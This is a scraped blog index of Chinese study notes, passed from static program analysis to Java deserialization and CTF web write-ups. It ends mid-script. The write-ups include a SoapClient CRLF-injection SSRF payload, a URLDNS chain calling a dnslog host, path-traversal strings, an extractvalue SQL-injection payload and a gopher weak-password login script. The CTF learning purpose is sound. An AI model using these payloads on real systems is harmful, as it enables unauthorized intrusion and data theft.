$x\\sqsubseteq y\\sqcup  z$，这里证明$y\\sqcup  z$是x的上界\n又因为 $x\\sqsubseteq x\\sqcup  z$，且 $x \\sqcup z$是x的least upper bound\n所以 $x \\sqcup z\\sqsubseteq y\\sqcup  z$\n\n到这里可以把不动点定理应用到iterative algorithm中\n这个证明我现在不是很懂，那是不是说明 x meet y也小于等于 y meet z呢\nReview the questions\n\n这个程序一定会达到不动点么？会，根据不动点定理\n\n如果达到了，只有一个不动点么？如果超过一个，如何确定我们得出的solution就是最好的呢？greatest or least fixed point\n\n我们的算法要经过多少步达到不动点? \n最坏情况是：h*k\n\n\nWhen will the algorithm reach the fixed point？\nlattice的高度：lattice中从bottom到top最长的path\n\n\n\n假设 lattice 的高度为 h，而我们的 CFG 节点数为 k，就算每次迭代可以使一个节点在 lattice 上升一个高度，那么最坏情况下，我们的迭代次数也就是 $i &#x3D; h \\times k$\n这也回答了上面最后一个问题\n\nMay and Must Analysis , a Lattice View\n都是从unsafe 向safe 走，\n\nMay  Analysis View将lattice抽象成一个视图\n例如，对于到达定值分析，下界代表没有任何可到达的定值，上界代表所有定值都可到达。\n目标：我们的目标是在程序运行后，找到一个可以替换的变量(优化)，也就是看最终哪个是0，如果是0的就可以被替换。\n那么在初始化的时候，用反证法要要求所有的都是0，然后找出不是0的。\n目标是找到可以替换的变量。\n\n下界代表 unsafe 的情形，即我们认为无到达定值，可对相关变量的存储空间进行替换，所有都能替换。**—-&gt;对应sound**\n上界代表 safe but useless 的情绪，即认为定值必然到达，但是这对我们寻找一个可替换掉的存储空间毫无意义，也就是所有的都不能替换。\n\n而因为我们采用了 join 函数，那么我们必然会从 lattice 的最小下界往上走。而越往上走，我们就会失去更多的精确值。那么，在所有不动点中我们寻找最小不动点，那么就能得到精确值最大的结果。\n\nMust Analysis View目标：找到最终表达式结果是1的，是1的就不用重复计算了，可以替换\n那初始化的时候，用反证法，就假设都是1，意思就是所有的表达式都没有其中的值被重新定义，也就是所有的表达式都可以用原来的值替换，这肯定是Unsafe的。\n反之，所有的表达式都不avaliable,需要重新计算所有的值，肯定是safe，都别优化了\n\n\n下界代表 safe but useless 的情形，因为需要重新计算每个表达式，即确实有表达式可用。而上界代表 unsafe，因为不是所有路径都能使表达式都可用。与 may analysis 一样，通过寻找最大不动点，我们能得到合法的结果中精确值最大的结果\n\nanother view of leaest fixed point\n以may analysis举例\n\ntranser function中 kill 和gen是固定的\ncontrol flow merge 是  union，对于lattice来说union是最小上界\n所以每次都走的是最小的一步，那最后得到的肯定是最小不动点\n\nHow Precise is our SolutionMeet-Over-All-Paths Solution(MOP)\n这里的meet包括(meet&#x2F;join)\n\n\n\n对所有的out应用transer function，再用meet操作符\nMOP在每条路径的结尾计算所有的data-flow的值，应用应用Meet去找到 lub &#x2F; glb\n\n但是基于上面的表达式可能有些问题\n问题1：有些路径是不可执行的（not executable）\n\n上面是考虑了所有的路径，但是有写路径可能永远不会被执行\n\nx=10;\nif(x>10)&#123;&#125;\n\n问题2：not unbounded(没有边界)\n\n如果有一条path中有循环，循环中定义s1,s2两个变量,也就是这条path上会包含非常多个s1,s2\n\nfor()&#123;\ns1;\ns2;\n&#125;\n\n问题3：Not enumerable\n\n可能程序很大，不可枚举\n\nOurs(iterative Algorithm) vs MOP\n\n我们的算法是在每一个merge的时候，join\n\nMOP是在最后merge\n\n\n把黄色的部分用x代替，红色的部分用y代替\n证明一下他俩的关系：\n\n\n这个很好理解，F($x\\sqcup y$)是F(x)和F(y)的upper bound,F(x)和F(y)的最小上界是$F(x)\\sqcup F(y)$\n所以$MOP \\sqsubseteq Ours$\n\n当F具有可分配性时\n\nbit-vector或者Gen&#x2F;kill的transer function(用join &#x2F; meet)都是distributive\n\n所以我们之前的都和MOP一样准确\n\n关于must analysis 还是 may analysis的分析Reaching definitons\n它的目标是：判断在此处定义的D1 … Di是否有意义，如果每意义，就被优化，1代表有意义，0代表无意义。\n也就是如果有一条路径是1，代表可能有意义，就不能被优化\n所以要 把结果并起来，所以是may analysis\n\nlive avaliables\n它的目标是判断变量后面是否被用了，如果是无意义的变量，就把它的空间释放掉，用来存储新的寄存器值\n1代表有意义，0代表无意义\n也就是如果有1条路有意义，就不应该被优化\n所以同上\n\navaliable expressions\n它的定义说要考虑所有的路径，是否在每一条路径都执行了x op y，如果都执行了，就可以把这个结果用一个新的变量替换\n那如果有一条路劲没计算，显然就不能别替换，输出是0\n所以要把所有的结果取 交集\n\nConstant Propagation程序的p点有一个变量x,判断在P点是否可以guaranteed x是一个常量\n\n要考虑所有的路径上是否定义的值都一样，如果有两条路径是x&#x3D;2，有一条是x&#x3D;3，那显然不行\n所以是must analysis\n\n从top往bottom走，最下面肯定是最安全的，因为你要考虑的问题(优化的目标)是 是否是constant，最下面是所有的都不是constant，所以肯定是safe\n\n考虑所有的meet\nnac：Not a constant\nV：value\n\nnac 和 v肯定是nac\n\nundef 和 v是 v\n但是这里有一种情况是，假设程序走了Undefined的路径，表示没有这个常量，但是输出结果是有一个常量，那在程序获取undefined三，少了一个值。\n解释：在constant propagation（常量传播）中，只考虑常量传播，不focus于未定义这种情况\n\n\nTransfer function\n _表示通配符，无论是啥值，都干掉\t\n\nx如果是常量，生成的就是x和对应的值\n如果x&#x3D;y，y是一个变量，那就去取y的值，如果是常量就是，不是就不是\nx&#x3D; y op z，就进行计算\n两个都是常量\n有一个不是常量\n其中有一个是undefi，或者两个都是undef\n\n\n\n这里提了一句，如果把undef给了一个值，那transfer function就不单调了。\n我的理解：\n回看定义\n现在需要证明：control flow也是单调的，也就是 join&#x2F;meet后的结果是也是单调的  LxL -&gt; L\n即需要证明 任意的x , y, z 属于L，x$\\sqsubseteq $y，需要证明 $x \\sqcup z \\sqsubseteq  y \\sqcup  z $\n\n假设z是undef，那 $x \\sqcup z \\sqsubseteq  y \\sqcup  z $ 这个表达式不一定成立\n\n为什么是Nondistributivity\n\niterative algorithm的结果是nac\nmop的结果是10\n他俩不相等，所以他就不是distributivity\n实际结果是10，mop准\n\nWorklist Algorithman optimization of iterative algorithm，是iterative algorithm的优化\n\n实际上用的是Worklist Algorithm\n\n回顾iterative algorithm\n\n\n有一个变化了，所有的都要重新算，很冗余\n\n\n\n总结Q1：理解迭代算法的功能\n\n包括初始化，bounary，must analysis和may analysis的初始化不一样\nin、out\n\nQ2：lattice和complete lattice\n\nlattice表示偏序集中的每两个元素都有最小上界和最大下界\ncomplete lattice表示偏序集的每个子集都有最小上界和最大下界\n\nQ3：理解不动点定理\n\n如果一个lattice是单调的，且有穷的，那可以通过迭代算法得到最小不动点\n\nQ4：在lattice中总结may analysis和must analysis\n\n关于Must analysis和may analysis，很重要的一点是要理解程序的目标是什么\n如果他的目标是找1，结果是1的被替换，那就是must analysis\n如果目标是找0，0的被替换，那就是May analysis\n\nQ5：MOP和迭代算法的关系\n\nMOP算法走所有的路径，在程序的最后merge\n而迭代算法在有merge的情况下就会merge\n\nQ6：关于常量传播\n\n他是Must analysis\n\nQ7：Worklist 算法\n\n对迭代算法进行优化，只计算变化的块，后面的指针分析都是worklist算法\n\n","slug":"Program-Analysis-02","date":"2023-08-26T15:30:43.000Z","categories_index":"","tags_index":"Program Analysis","author_index":"XyM4ster"},{"id":"eee198b3106cda0f3696061d93d628ad","title":"Program-Analysis-01","content":"引言\n学这个的起因是想入门一下模糊测试方向，跟着知乎的学习路线，学了这个课程\n谭老师和李老师讲的非常非常好\n兜兜转转学这个已经很久了，感觉很多地方还是不是理解的很明白\n\nProgramming Languages(PL)\n\n在运行程序前，分析程序可能有的问题\n\n静态分析是在编译时，在程序运行之前，判断一个程序是否满足一些性质\n\n\n\n\n对于这些interesting proverties，比如是否有空指针，是不能直接被给出准确的答案的\n\n\nsound包括truth\n\ncomplete爆出来的一定是truth\n\n\n从上面可以发现没有perfect，所以要么妥协soundness，要么妥协completeness\n妥协soundness就会产生漏报\n妥协completeness就会产生误报\n\n\n所以 几乎所有的静态分析都是sound，意思就是能多报几个，即使里面有误报，也不漏报   \n\n\n只有分析了 蓝色和 绿色两条路径，才能分析出 它是 not safe，所以要soundness\n\n\n第一种方法虽然准确度高，但是浪费内存\n确保soundness(准确度)，保证精度和速度的平衡\n第一步：先抽象\n\n\n\n\n没有确定的值，用新的符号表示\n\n第二步：转换规则\n\n第三步：根据上一步确定的规则计算\n\n\n可以看出静态分析是有用的，但是由于是sound，over-approximated，  对于3来说就是误报，因为他是9\n\n\n\nflow merge很重要，因为很难考虑所有情况\n\n\n\n总结Q1：静态分析和动态测试有什么不同？\n\n静态分析是在程序编译时进行分析\n\n**Q2：soundness和completeness **\n\n静态分析不能直接给出准确的答案，要么是soundness，也就是过近似，包括很多结果，但是会误报\n要么是completeness，很精确，但是会漏报\n静态分析都是soundness\n\nQ3：为什么静态分析需要soundness？\n\n很显然他需要报出所有可能的结果\n\nQ4：如何理解抽象和over-approximation？\n如果想在程序运行前判断这个程序，那就需要对程序中的一些运算进行抽象，形成一定的规则来进行判断\n\n抽象之后的结果是尽可能满足所有情况的，对于特殊情况，就会有错误，所以是over-approximation\n\nintermediate representation\nCompiler\n\n词法分析器（Scanner），结合正则表达式，通过词法分析（Lexical Analysis）将 source code 翻译为 token。\n\n语法分析器（Parser），结合上下文无关文法（Context-Free Grammar），通过语法分析（Syntax Analysis），将 token 解析为抽象语法树（Abstract Syntax Tree, AST）\n\n语义分析器（Type Checker），结合属性文法（Attribute Grammar），通过语义分析（Semantic Analysis），将 AST 解析为 decorated AST\n\nTranslator，将 decorated AST 翻译为生成三地址码这样的中间表示形式（Intermediate Representation, IR），并基于 IR 做静态分析（例如代码优化这样的工作）。\n\n\n经过前面所有的处理生成 IR ，静态分析器 对 IR进行分析 \nAST vs IR为什么Compiler中用IR而不是AST呢\n\n\nAST是high-level，接近语法结构的\nAST是依赖语言的\nAST适合快速的类型检查\nAST缺少控制流信息，IR中的go to可以轻易的看出控制流信息\n\nIR:3AC\n为什么叫3地址码？\n\n名称： a,b\n常量：3\n编译器生成的临时变量：t1,t2\n\n常见的 3AC 包括：\n\nx &#x3D; y bop z：双目运算并赋值，bop &#x3D; binary operator\nx &#x3D; uop z：单目运算并赋值，uop &#x3D; unary operator\nx &#x3D; y：直接赋值\ngoto L：无条件跳转，L &#x3D; label\nif x goto L：条件跳转\nif x rop y goto L：包含了关系运算的条件跳转，rop &#x3D; relational operator\n\n3AC in real static Analyzer SootSoot是个静态分析的框架，其中的IR是Jimple\n在Soot中，Java源代码首先被编译成Java字节码，然后将字节码转换为Jimple表示形式\nJimple：(Java Intermediate Language）是一种用于表示Java字节码的中间语言\njvm中的方法调用:（PL）\ninvokespecial：call constructor, call superclass method(调用父类方法)，call private methods \n\ninvokevirtual：call  instance methods（virtual dispatch 动态分配）\n\ninvokeinterface：call static methods\n\nmethod Signature：包含 class name（方法声明所在的类 ）  return type  method name(parameter1 type,parameter2 type)\n\n\n下面是一些Jimple和对应的Java程序\n\n方法调用\n\n\n\nspecialinvoke是在调用StringBuilder的构造器，void 表示没有返回值\n\nspecialinvoke $r3.&lt;java.lang.StringBuilder: void &lt;init&gt;()&gt;();  \n\n$r3表示临时变量，&lt;&gt;中的东西是method Signature, java.lang.StringBuilder就是所在的类, **&lt; init &gt;**是默认的构造函数\n\n$r3 = virtualinvoke $r3.&lt;java.lang.StringBuilder: java.lang.StringBuilder append(java, lang.String)&gt;(r1);\n\n是在$r3的基础上调用的方法， $r3是StringBuilder类，返回值是StringBuilder，调用append方法，java, lang.String是参数 类型\n\n\nmain方法调用\n\n\n如果没给显示的构造函数，就会默认的生成一个构造函数\n\n静态方法调用\n\n\nclinit：一个类的静态初始化的函数，用于在类记载过程中执行类的初始化\n:::tips\nJava虚拟机加载一个类时，它会首先检查是否存在类的静态初始化代码块（static &#123;&#125;），如果存在，则将这些代码块的内容放入&lt;clinit&gt;方法中。&lt;clinit&gt;方法会在类首次使用之前被调用，确保类的静态初始化在使用之前完成\n:::\nStatic Single Assignment(SSA）静态单赋值\n\n也就是每次都用一个最新的变量\n\n\n\n在merge的时候，会用$phi$，根据控制流的信息决定选择哪个变量\n\n","slug":"Program-Analysis-01","date":"2023-08-20T13:29:01.000Z","categories_index":"","tags_index":"Program Analysis","author_index":"XyM4ster"},{"id":"0294fa813f0b0ba2157b9babe3fad644","title":"reverse","content":"好书推荐\n恶意代码分析实战\n逆向工程核心原理\n加密和解密\n\n","slug":"reverse","date":"2023-08-12T13:29:43.000Z","categories_index":"","tags_index":"re_books","author_index":"XyM4ster"},{"id":"7873af0b12d3f7cc53b7d970bb6378b1","title":"java反序列化","content":"java序列化和反序列化\nClick to see more\npublic class Animal &#123;\n    private String color;\n\n    public Animal() &#123;//没有无参构造将会报错\n        System.out.println(\"调用 Animal 无参构造\");\n    &#125;\n\n    public Animal(String color) &#123;\n        this.color = color;\n\n        System.out.println(\"调用 Animal 有 color 参数的构造\");\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"Animal&#123;\" +\n                \"color='\" + color + '\\'' +\n                '&#125;';\n    &#125;\n&#125;\n\nimport java.io.Serializable;\n\npublic class BlackCat extends Animal implements Serializable &#123;\n    private static final long serialVersionUID = 1L;\n    private String name;\n\n    public BlackCat() &#123;\n        super();\n        System.out.println(\"调用黑猫的无参构造\");\n    &#125;\n\n    public BlackCat(String color, String name) &#123;\n        super(color);\n        this.name = name;\n        System.out.println(\"调用黑猫有 color 参数的构造\");\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"BlackCat&#123;\" +\n                \"name='\" + name + '\\'' +super.toString() +'\\'' +\n                '&#125;';\n    &#125;\n&#125;\n\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\n\npublic class SuperMain &#123;\n    private static final String FILE_PATH = \"./super.bin\";\n\n    public static void main(String[] args) throws Exception &#123;\n        serializeAnimal();\n        deserializeAnimal();\n    &#125;\n\n    private static void serializeAnimal() throws Exception &#123;\n        BlackCat black = new BlackCat(\"black\", \"我是黑猫\");\n        System.out.println(\"序列化前：\"+black.toString());\n        System.out.println(\"=================开始序列化================\");\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(FILE_PATH));\n        oos.writeObject(black);\n        oos.flush();\n        oos.close();\n      //animal 因为没有实现序列化接口，因此对应的 color 属性就不会被序列化，因此反序列得到的 color 值就为 null\n    &#125;\n\n    private static void deserializeAnimal() throws Exception &#123;\n        System.out.println(\"=================开始反序列化================\");\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FILE_PATH));\n        BlackCat black = (BlackCat) ois.readObject();\n        ois.close();\n        System.out.println(black);\n    &#125;\n&#125;\n\n\n\n\n如果要序列化的对象的父类 Animal 没有实现序列化接口，那么在反序列化时是会调用对应的无参构造方法的这样做的目的是重新初始化父类的属性,此时color的值为null\n\n\n\ntransient 标识的对象成员变量不参与序列化\n\n\n这里我在 Blackcat的name前加了transient，他就不会被序列化\n\n\n\n重写writeObject、readObject方法\n\n\n现在有一个新的需求，对于一个 数组如果开辟了100个空间，但是只存了30个元素，这种显然不能把所有的都序列化，因此可以自定义序列化过程\n\n这里如果我在类中重写了这两个方法，那就会调用我重写的这个\n\n\nimport java.io.Serializable;\n\npublic class BlackCat extends Animal implements Serializable &#123;\n    private static final long serialVersionUID = 1L;\n    private String name;\n\n    public BlackCat() &#123;\n        super();\n        System.out.println(\"调用黑猫的无参构造\");\n    &#125;\n\n    public BlackCat(String color, String name) &#123;\n        super(color);\n        this.name = name;\n        System.out.println(\"调用黑猫有 color 参数的构造\");\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"BlackCat&#123;\" +\n                \"name='\" + name + '\\'' +super.toString() +'\\'' +\n                '&#125;';\n    &#125;\n\n\tprivate void writeObject(java.io.ObjectOutputStream s)\n            throws java.io.IOException &#123;\n        //执行 JVM 默认的序列化操作\n        s.defaultWriteObject();\n \n \n        //手动序列化 arr  前面30个元素\n        for (int i = 0; i &lt; 30; i++) &#123;\n            s.writeObject(arr[i]);\n        &#125;\n    &#125;\n \n    /**\n     * Reconstitute the &lt;tt>ArrayList&lt;/tt> instance from a stream (that is,\n     * deserialize it).\n     */\n    private void readObject(java.io.ObjectInputStream s)\n            throws java.io.IOException, ClassNotFoundException &#123;\n \n        s.defaultReadObject();\n        arr = new Object[30];\n \n        // Read in all elements in the proper order.\n        for (int i = 0; i &lt; 30; i++) &#123;\n            arr[i] = s.readObject();\n        &#125;\n    &#125;\n\n&#125;\n\n\n\n\n\n也就是 只要反序列化，服务器就回运行readObject方法，不管我写啥它都执行\n\njava反射\n反射就是通过Class，变回原来的\n\n\nClick to see more\nimport java.io.Serializable;\n\npublic class BlackCat implements Serializable &#123;\n    private static final long serialVersionUID = 1L;\n    public String name;\n    private String color;\n\n    public BlackCat() &#123;\n        super();\n        System.out.println(\"调用黑猫的无参构造\");\n    &#125;\n\n    public BlackCat(String color, String name) &#123;\n        this.color = color;\n        this.name = name;\n        System.out.println(\"调用黑猫有 color 参数的构造\");\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"BlackCat&#123;\" +\n                \"name='\" + name + '\\'' + \"color =\"+ color + '\\'' +\n                '&#125;';\n    &#125;\n&#125;\n\n\n\n\nBlackCat blackCat = new BlackCat();\nClass c = blackCat.getClass();\n\n\n这里面的Class相当于所有class的原型类\n\n获取constructor c.newInstance();//这里会调用无参构造器\nConstructor constructor = c.getConstructor(String.class, String.class);\nObject cat = constructor.newInstance(\"aa\", \"bb\");\nSystem.out.println(cat);\n\n\n获取fieldsField[] fields = c.getFields();\n\n\n修改属性\n\nConstructor constructor = c.getConstructor(String.class, String.class);\n//这里传参数表示指定使用哪个构造器\nObject cat = constructor.newInstance(\"aa\", \"bb\");\nField color = c.getDeclaredField(\"name\");\ncolor.set(cat,\"ccccccc\");\nSystem.out.println(cat);\n\n\n\n可以看到改值成功了\n\n修改Private属性Field color = c.getDeclaredField(\"color\");\ncolor.setAccessible(true);\ncolor.set(cat,\"blackyellow\");\nSystem.out.println(cat);\n\n\ncolor.setAccessible(true);这样才可以访问private属性\n\n修改属性\nMethod hello = c.getMethod(\"hello\", String.class);\nhello.invoke(cat, \"aaaaaaaaa\");\n\n\n也就是这里指明你要改的是cat这个类，并传递后面的参数\n\nLazyList.scala\nprivate object State &#123;\n  @SerialVersionUID(3L)\n  object Empty extends State[Nothing] &#123;\n    def head: Nothing = throw new NoSuchElementException(\"head of empty lazy list\")\n    def tail: LazyList[Nothing] = throw new UnsupportedOperationException(\"tail of empty lazy list\")\n  &#125;\n\n  @SerialVersionUID(3L)\n  final class Cons[A](val head: A, val tail: LazyList[A]) extends State[A]\n&#125;\n\n\n\nClass clazz = Class.forName(className);\nField field = clazz.getDeclaredField(fieldName);\n\n\n前面的是color，这里应该是为了可以直接访问Object Empty的方法和属性，也就是head 和 tail\nURLDNS链原理\n首先要找一个入口，肯定要实现Serialible\n\n\t\n\n\nentry就是每个key-value的键值对\nHashMap&lt;URL, Integer> urlIntegerHashMap = new HashMap&lt;>();\nurlIntegerHashMap.put(new URL(\"http://xn4tle.dnslog.cn\"),1);\n//这里的逻辑是，  hashmap在put\nObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"1.txt\"));\noos.writeObject(urlIntegerHashMap);\noos.flush();\noos.close();\n\n\n这里的逻辑是，  hashmap在put时会调用putVal方法\n\n\n\n\n\n然后会调用hashCode，这里可以理解成toString()，也就是在方法可以重写hashCode,就会调用自己的\n\n\n\n\n\n\n\n\n提示\nnative关键字表示该方法的实现是依赖于特定的操作系统和硬件平台，并且与Java语言规范无关\n\n\n\n对于URL类来说，他自己重写了 hashCode\n\n\n\n进一步的，会调用getHostAddress，也就是\n\n\n\n\n这里也就会发起请求，因此hashmap在put时会发起请求，这里可以通过Dnslog看到\n\n\n\n构造链\n现在我需要在反序列化时让它发起dns请求，hashcode的默认值是-1，现在需要在序列化前，让hashcode!=-1\n\n\n- \n","slug":"java反序列化","date":"2023-08-07T02:18:56.000Z","categories_index":"","tags_index":"java","author_index":"XyM4ster"},{"id":"df0d3403c0b3873dd87fee8ad4e5e9ae","title":"CTF_web_wp","content":"比赛经验\nssrf\n服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)\n攻击者能够利用目标帮助攻击者访问其他想要攻击的目标\n攻击者要求服务器为他访问URL\n可用于内网访问\n\nnetstatehttps://zhuanlan.zhihu.com/p/397058259\n.\\nc64.exe -lvp 9999\n\n监听9999端口\n-l： 开启监听\n-p：指定端口\n-t： 以telnet形式应答\n-e：程序重定向\n-n：以数字形式表示ip\n-v：显示执行命令过程\n-z : 不进行交互，直接显示结果\n-u ：使用UDP协议传输\n-w : 设置超时时间\n本地测试\n\n\n\n\n\n提示\n\nSoapClient::__construct(?string $wsdl, array $options &#x3D; []) ,SoapClient类，\n\n第二个参数中 uri指nameSpacelocation \n\nlocation：The URL of the SOAP server to send the request to.\n\n&lt;?php\n$ua=\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\";\n$client=new SoapClient(null,array('uri'=>\"127.0.0.1\",'location'=>\"http://127.0.0.1:9999\",);\n$client->getFlag();  //调用不存在的方法，会自动调用——call()函数来发送请求\n?>\n\n调用不存在的方法，会自动调用__call()函数来发送请求，因此才可以监听到\n\n监听到的信息如下:\n\n\n\n\n这里可以看到User-Agent是可以注入的\n&lt;?php\n$ua=\"ctfshow\\r\\nx-forwarded-for:127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\";\n$client=new SoapClient(null,array('uri'=>\"127.0.0.1\",'location'=>\"http://127.0.0.1/flag.php\",'user_agent'=>$ua));\n$client->getFlag();  //调用不存在的方法，会自动调用——call()函数来发送请求\n?>\n\n\n\n\n\n\n提示\n知识点：\n\nwindows中使用\\r\\n表示换行\n\n\n监听到的信息如下：\n\n\n\n\n因为Content-length是13，所以到标记2处就已经结束了，后面的包服务器会忽略\n\n例题\n\n由于这里不存在getFlag()方法，且需要访问flag.php，直接访问flag.php的结果如下：\n\n\n\n这就需要用ssrf内网访问\n&lt;?php\n$ua=\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\";\n$client=new SoapClient(null,array('uri'=>\"127.0.0.1\",'location'=>\"http://127.0.0.1\",'user_agent'=>$ua));\n// $client->getFlag();  //调用不存在的方法，会自动调用__call()函数来发送请求\necho urlencode(serialize($client));\n?>\n\n在反序列化后，会访问127.0.0.1&#x2F;flag.php，此时因为vip-&gt;getFlag()不存在，所以会用__call()函数来发送请求\n\n因此在我构造好的$client中就已经满足了flag.php的要求，会将flag写入flag.txt中\n\n直接访问flag.txt就可以获得flag\n\n\n做题思路\n提醒自己\n耐心的看函数源码，查关键字如flag、admin、user等\n耐心的看给出的函数，这里一定有可以用的\n\n\n存在目录穿越假设目录是post.wtf?post=aaaaa\n\n直接用post=aaaaa../测试\n去掉post后参数用post=../测试\n../被过滤了用....//测试\n\n有提示的地方console、查看源码、Git上找项目名称\nlinux的关键目录\n如果/etc/passwd中有/bin/bash\n访问/home/www/.bash_history可以看到执行过的历史命令\n\n语言或者框架.pl\n找它的关键特征，如后缀，版本号\n结合具体给出的信息，在网上找相关的漏洞\n如给出后缀是.pl，存在文件上传界面，查perl的文件上传\n\nJSESSIONID\njava框架，加载struct2的相关目录\n\nfuzz测试存在文件包含，可以查看源码0x01\n0x02\n\n这里显然也是文件包含，根据提示是需要读取/etc/nginx/sites-enabled/site.conf\n\n测试1：\n\n首先在file处填/etc/nginx/sites-enabled/site，在ext处填conf\n发现不行\n\n测试2：\nfile=/etc/nginx/sites-enabled/site.conf&amp;conf=\n\n\n发现不行\n\n测试3：\n\n测试目录穿越，最多测试5个../,这里发现../被禁了\nfile=../../../../etc/nginx/sites-enabled/site.conf&amp;conf=\n测试4：\n\n用....//代替../,成功显示源码\nfile=....//....//....//....//etc/nginx/sites-enabled/site.conf&amp;conf=\n\n找到可以交互的地方\n有可能出现在包的cookie处\n404页面处\n一切地方，总之仔细看包\n\nsql注入题解题步骤\n一般是有一个register.php和一个login.php\n正常注册账号密码，登录进去\n\n找注入点\n\n\n\n\n\n提示\n\n一切我输入的东西，之后显示出来了，都说明存在交互，也就是都可能存在注入\n如果没有回显，可能需要盲注\n\n\n\n注入点是登陆之后的信息\n\n\n\n\n\n\n\n\n攻防世界 难度5 unfinish\n\n在注册界面是输入email、username、password\n\n\n\n这里发现输入只需要输入email、password\n\n\n\n登录之后，发现显示了用户名，所有交互的界面，只有这里\n\n\n\n所有可能在username处存在注入\n\n测试可用的字符\n首先测试的时候要多试，到底过滤了没，比如遇到过如果注册成功包返回302，没成功返回200的。要用Burp试、hackbar试、登录框试\n\n\nfuzz测试可用的字符\n\n命令闭合insert 语句\n比如注册时候填的信息是被insert到数据库中的\ninsert into user('username','password') values('$username','$password')\n\n就可以用Mysql的运算闭合\n\n输入\n0'+select hex(database())+'0\n\n之后就可以用ascii + substr爆破具体的信息\n\n\naddslashes\naddslashes后，在存入数据库时，并不会加入反斜杠，也就是你写啥就存啥\n但是当你从数据库中再取出来用的时候，这时候我之前构造的sql语句就会执行\n所以重点关注addslashes后，什么从数据库中取出来了\n\n文件上传题\n攻防世界 filemanager\n\nnginxNginx配置中root和alias分不清？本文３分钟帮你解惑！\nserver &#123;\n    listen 8080; ## listen for ipv4; this line is default and implied\n    listen [::]:8080; ## listen for ipv6\n\n    root /var/www/html;\n    index index.php index.html index.htm;\n    port_in_redirect off;\n    server_name _;\n\n    # Make site accessible from http://localhost/\n    #server_name localhost;\n\n    # If block for setting the time for the logfile\n    if ($time_iso8601 ~ \"^(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)\") &#123;\n       set $year $1;\n       set $month $2;\n       set $day $3;\n    &#125;\n    # Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html\n    sendfile off;\n\n        set $http_x_forwarded_for_filt $http_x_forwarded_for;\n        if ($http_x_forwarded_for_filt ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+) &#123;\n                set $http_x_forwarded_for_filt $1???;\n        &#125;\n\n    # Add stdout logging\n\n    access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;\n    error_log /var/log/nginx/error.log info;\n\n    location / &#123;\n        # First attempt to serve request as file, then\n        # as directory, then fall back to index.html\n        try_files $uri $uri/ /index.php?q=$uri&amp;$args;\n        server_tokens off;\n    &#125;\n\n    #error_page 404 /404.html;\n\n    # redirect server error pages to the static page /50x.html\n    #\n    error_page 500 502 503 504 /50x.html;\n    location = /50x.html &#123;\n        root /usr/share/nginx/html;\n    &#125;\n    location ~ \\.php$ &#123;\n        try_files $uri $uri/ /index.php?q=$uri&amp;$args;\n        fastcgi_split_path_info ^(.+\\.php)(/.+)$;\n        fastcgi_pass unix:/var/run/php/php5.6-fpm.sock;\n        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n        fastcgi_param SCRIPT_NAME $fastcgi_script_name;\n        fastcgi_index index.php;\n        include fastcgi_params;\n        fastcgi_param REMOTE_ADDR $http_x_forwarded_for;\n    &#125;\n\n    location ~ /\\. &#123;\n            log_not_found off;\n            deny all;\n    &#125;\n    location /web-img &#123;\n        alias /images/;\n        autoindex on;\n    &#125;\n    location ~* \\.(ini|docx|pcapng|doc)$ &#123;  \n         deny all;  \n    &#125;  \n\n    include /var/www/nginx[.]conf;\n&#125;\n\n\n\n对于这个配置文件，可以看到，也就是当访问&#x2F;web-img时，当用户访问https://www.wljslmz.cn/web-img/wljslmz.png时，会找到/images/wljslmz.png，图片会被映射到`/images`，且此时是根目录。\nlocation /web-img &#123;\n    alias /images/;\n    autoindex on;\n&#125;\n\n那么也就可以访问/web-img../进行目录穿越\n\n\n一直提示需要登陆\n\n这种用burp抓包，看cookie\n\n把这里改成1就好了\n\n\n有源码的\n这种就需要很耐心，逐个搜一下每个函数\n逐段看每一个源码\n\n攻防世界 very_easy_sql(难度3) ssrf思路\n\n点进去之后，发现这显然是ssrf，之前学的ssrf都是直接ssrf+mysql或者ssrf+redis，这里有ssrf+mysql会显示no,no,no，显然不行\n\n放弃，看wp\nwp查看源码发现curl\n由于最开始的index.php界面需要是内网用户，且需要输入密码，因此找到可以curl的地方。\n查看源码，发现&#x2F;use.php(草，太久没做，查看源码都忘了)\n\n\ngopher+弱密码登录\n可以用gopher访问127.0.0.1:80的index.php界面，上脚本，尝试用gopher+弱密码登录。burp抓包，访问&#x2F;use.php。\nimport urllib.parse\nimport base64\n\n\nhost = \"127.0.0.1:80\"\ncontent = \"uname=admin&amp;passwd=admin\"\n\n# str = \"admin') and extractvalue(1, concat(0x7e, (substr((select group_concat(flag) from flag), 20,50)),0x7e)) #\"\n# # 将字符串编码为bytes类型，然后使用base64.b64encode()函数进行Base64编码\n# encoded_bytes = base64.b64encode(str.encode('utf-8'))\n\n# # 将bytes类型的编码结果转换为字符串类型\n# encoded_str = encoded_bytes.decode('utf-8')\n\ncontent_length = len(content)\n# cookie = f'this_is_your_cookie=&#123;encoded_str&#125;'\ntest =\\\n\"\"\"POST /index.php HTTP/1.1\nHost: &#123;&#125;\nContent-Type: application/x-www-form-urlencoded\nContent-Length: &#123;&#125;\n\n&#123;&#125;\n\"\"\".format(host,content_length, content)#\\用于将字符串延续到下一行\n\ntmp = 